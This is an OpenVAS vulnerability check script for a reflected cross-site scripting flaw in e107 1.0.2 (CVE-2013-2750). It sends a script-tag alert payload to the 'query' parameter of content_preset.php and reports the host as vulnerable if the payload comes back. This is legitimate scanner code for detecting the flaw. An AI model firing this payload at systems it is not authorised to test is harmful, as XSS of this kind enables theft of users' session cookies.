##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_e107_query_xss_vuln.nasl 6769 2017-07-20 09:56:33Z teissa $
#
# e107 query Cross Site Scripting Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804230";
CPE = "cpe:/a:e107:e107";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6769 $");
  script_cve_id("CVE-2013-2750");
  script_bugtraq_id(58841);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-01-28 15:46:24 +0530 (Tue, 28 Jan 2014)");
  script_name("e107 query Cross Site Scripting Vulnerability");

  tag_summary =
"This host is running e107 and is prone to cross site scripting
vulnerability.";

  tag_vuldetect =
"Send a crafted string via HTTP GET request and check whether it
is able to inject HTML code.";

  tag_insight =
"The flaw is due to input passed via the 'query' parameter to
'content_preset.php', which is not properly sanitised before using it.";

  tag_impact =
"Successful exploitation will allow remote attackers to steal the victim's
cookie-based authentication credentials.

Impact Level: Application";

  tag_affected =
"e107 version 1.0.2, Other versions may also be affected.";

  tag_solution =
"Upgrade e107 to version 1.0.3 or later,
For updates refer to http://www.e107.org/";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/83210");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52858");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("e107_detect.nasl");
  script_mandatory_keys("e107/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
eport = "";
dir = "";
url = "";

## Get HTTP Port
if(!eport = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:eport)){
  exit(0);
}

## Construct the attack request
exploit = "<script%0d%0a>alert(12345678901)</script>";
url = dir + "/e107_plugins/content/handlers/content_preset.php?query=" + exploit;

## Check Exploit is working
if(http_vuln_check(port:eport, url:url, check_header:TRUE,
                   pattern:">alert\(12345678901\)</script>"))
{
  report = report_vuln_url( port:eport, url:url );
  security_message(port:eport, data:report);
  exit(0);
}
